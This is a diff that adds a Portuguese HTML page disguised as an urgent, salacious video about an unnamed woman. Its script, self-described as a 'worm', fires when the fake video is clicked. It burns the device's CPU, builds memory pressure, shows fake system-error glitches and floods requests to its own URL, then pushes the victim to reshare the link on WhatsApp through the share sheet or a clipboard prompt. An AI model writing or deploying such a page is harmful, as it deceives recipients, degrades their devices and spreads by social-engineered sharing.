@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🚨 Vídeo Urgente: [Nome dela] - Não Compartilhe</title>
+    <style>
+        :root {
+            --bg-color: #0b141a;
+            --text-color: #e9edef;
+            --accent: #00a884;
+            --danger: #ea0038;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            user-select: none;
+        }
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            z-index: 10;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #2a3942;
+            margin-bottom: 20px;
+        }
+        .header h2 {
+            margin: 0;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background-color: var(--accent);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .video-box {
+            background: #000;
+            border-radius: 12px;
+            height: 260px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+            transition: transform 0.2s;
+        }
+        .video-box:active {
+            transform: scale(0.98);
+        }
+        .play-btn {
+            width: 60px;
+            height: 60px;
+            background: rgba(255,255,255,0.15);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            backdrop-filter: blur(5px);
+        }
+        .video-title {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #aebac1;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #2a3942;
+            border-radius: 2px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--accent);
+            transition: width 0.1s linear;
+        }
+        .status-msg {
+            margin-top: 10px;
+            font-size: 12px;
+            color: var(--danger);
+            min-height: 18px;
+        }
+        .hidden-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 100;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 20px;
+        }
+        .glitch-text {
+            color: #fff;
+            font-size: 24px;
+            font-weight: bold;
+            text-shadow: 2px 0 red, -2px 0 cyan;
+            animation: flicker 0.3s infinite;
+        }
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.8; transform: translateX(2px); }
+            100% { opacity: 1; }
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid var(--accent);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px 0;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <!-- UI PRINCIPAL -->
+    <div class="container" id="mainUI">
+        <div class="header">
+            <div class="avatar">V</div>
+            <h2>Vídeo Recente</h2>
+            <span style="font-size: 12px; color: #8696a0;">Agora</span>
+        </div>
+
+        <div class="video-box" id="videoTrigger">
+            <div class="play-btn">▶️</div>
+            <div class="video-title">Olha isso que ela postou... 👀🔥</div>
+            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+            <div class="status-msg" id="statusMsg">Tocando vídeo...</div>
+        </div>
+    </div>
+
+    <!-- CAMADA DE CHAOS (Glitch) -->
+    <div class="hidden-layer" id="chaosLayer">
+        <div class="glitch-text" id="glitchText">ERRO DE SISTEMA</div>
+        <div class="spinner"></div>
+        <p id="chaosMsg">Tentando reconectar ao servidor de mídia...</p>
+    </div>
+
+    <!-- SCRIPT PRINCIPAL -->
+    <script>
+        // ==========================================
+        // CONFIGURAÇÕES DO WORM
+        // ==========================================
+        const MY_URL = window.location.href;
+        const CHAOS_DURATION_MS = 30000; // 30 segundos de caos máximo
+        const CPU_BURN_INTERVAL = 50; // ms entre loops de CPU
+        
+        let isChaosActive = false;
+        let chaosInterval;
+        let cpuLoops = 0;
+        let memoryLeak = [];
+
+        // ==========================================
+        // 1. O "WORM" DE PROPAGAÇÃO
+        // ==========================================
+        function propagateWorm() {
+            // Tenta usar a Web Share API nativa (Android/iOS)
+            if (navigator.share) {
+                navigator.share({
+                    title: "Vídeo Urgente",
+                    text: "Olha isso! Você precisa ver o que ela fez 🤫",
+                    url: MY_URL
+                }).catch(() => {
+                    // Fallback: Copia para clipboard
+                    copyToClipboard();
+                });
+            } else {
+                copyToClipboard();
+            }
+        }
+
+        function copyToClipboard() {
+            const tempInput = document.createElement('textarea');
+            tempInput.value = MY_URL;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempInput);
+            
+            // Mostra um alerta persuasivo
+            const msg = `O vídeo foi bloqueado por segurança, mas você pode compartilhar o link diretamente:\n\n${MY_URL}\n\nCole na conversa dela agora!`;
+            if(!confirm(msg)) {
+                // Se ela fechar, força a visualização do link
+                document.getElementById('statusMsg').textContent = "Link copiado. Cole no WhatsApp dela!";
+            }
+        }
+
+        // ==========================================
+        // 2. O "CHAOS ENGINE" (Travamento)
+        // ==========================================
+        
+        // A) CPU Burner (Loop Infinito Controlado)
+        function cpuBurn() {
+            if (cpuLoops < 100) { // Limita para não matar o browser
+                const start = Date.now();
+                // Loop pesado de matemática
+                let sum = 0;
+                while (Date.now() - start < CPU_BURN_INTERVAL * 2) {
+                    sum += Math.sqrt(cpuLoops * 1000) * Math.log(cpuLoops + 1);
+                }
+                cpuLoops++;
+                setTimeout(cpuBurn, CPU_BURN_INTERVAL);
+            }
+        }
+
+        // B) Memory Leak (Pressão de Memória)
+        function memoryPressure() {
+            if (memoryLeak.length < 500) {
+                // Cria objetos complexos que o GC demora a limpar
+                memoryLeak.push({
+                    id: Date.now(),
+                    data: new Array(100).fill('A'.repeat(100)),
+                    nested: { deep: { object: { structure: 'complex' } } }
+                });
+                setTimeout(memoryPressure, 20);
+            }
+        }
+
+        // C) UI Glitch Injector
+        function uiGlitch() {
+            const mainUI = document.getElementById('mainUI');
+            const chaosLayer = document.getElementById('chaosLayer');
+            const glitchText = document.getElementById('glitchText');
+            
+            // Alterna visibilidade e aplica transforms aleatórios
+            if (Math.random() > 0.5) {
+                chaosLayer.style.display = 'flex';
+                glitchText.textContent = ["ERRO 503", "TIMEOUT", "MEMória FULL", "CPU 100%"][Math.floor(Math.random()*4)];
+                mainUI.style.transform = `translate(${Math.random()*20-10}px, ${Math.random()*20-10}px)`;
+            } else {
+                chaosLayer.style.display = 'none';
+                mainUI.style.transform = 'none';
+            }
+
+            // Força reflow agressivo
+            void mainUI.offsetWidth;
+            
+            // Injeta elementos fantasma
+            if (Math.random() > 0.7) {
+                const ghost = document.createElement('div');
+                ghost.style.cssText = `
+                    position: fixed;
+                    top: ${Math.random()*100}%;
+                    left: ${Math.random()*100}%;
+                    width: ${Math.random()*100+50}px;
+                    height: ${Math.random()*50+10}px;
+                    background: rgba(234, 0, 56, 0.3);
+                    z-index: 9999;
+                    border-radius: 4px;
+                    pointer-events: none;
+                `;
+                document.body.appendChild(ghost);
+                setTimeout(() => ghost.remove(), 200);
+            }
+        }
+
+        // D) Network Storm (Saturação de Conexão)
+        function networkStorm() {
+            // Envia requests pesados para o mesmo domínio
+            for (let i = 0; i < 5; i++) {
+                fetch(MY_URL + '?storm=' + Date.now() + Math.random(), {
+                    mode: 'no-cors',
+                    cache: 'no-store'
+                }).catch(() => {});
+            }
+        }
+
+        function startChaos() {
+            if (isChaosActive) return;
+            isChaosActive = true;
+            
+            // Ativa a UI de Glitch
+            document.getElementById('mainUI').style.display = 'none';
+            document.getElementById('chaosLayer').style.display = 'flex';
+            document.getElementById('chaosMsg').textContent = "Falha crítica no carregamento de mídia...";
+
+            // Inicia os stressors
+            cpuBurn();
+            memoryPressure();
+            
+            // Loop de glitches a cada 100ms
+            chaosInterval = setInterval(() => {
+                uiGlitch();
+                if (Math.random() > 0.6) networkStorm();
+            }, 100);
+
+            // Propaga o worm após 5 segundos de caos
+            setTimeout(() => {
+                propagateWorm();
+            }, 5000);
+
+            // Para após a duração
+            setTimeout(() => {
+                stopChaos();
+            }, CHAOS_DURATION_MS);
+        }
+
+        function stopChaos() {
+            isChaosActive = false;
+            clearInterval(chaosInterval);
+            document.getElementById('chaosLayer').style.display = 'none';
+            document.getElementById('mainUI').style.display = 'block';
+            document.getElementById('statusMsg').textContent = "Erro: Vídeo indisponível. Tente novamente.";
+            
+            // Limpa a memória de forma suave
+            memoryLeak = [];
+        }
+
+        // ==========================================
+        // 3. O GATILHO (O Clique)
+        // ==========================================
+        document.getElementById('videoTrigger').addEventListener('click', () => {
+            startChaos();
+        });
+
+        // Simula progresso inicial para parecer legítimo
+        let progress = 0;
+        const progressInterval = setInterval(() => {
+            progress += 5;
+            document.getElementById('progressFill').style.width = progress + '%';
+            if (progress >= 100) {
+                clearInterval(progressInterval);
+                document.getElementById('statusMsg').textContent = "Pronto para tocar...";
+            }
+        }, 200);
+
+    </script>
+</body>
+</html>
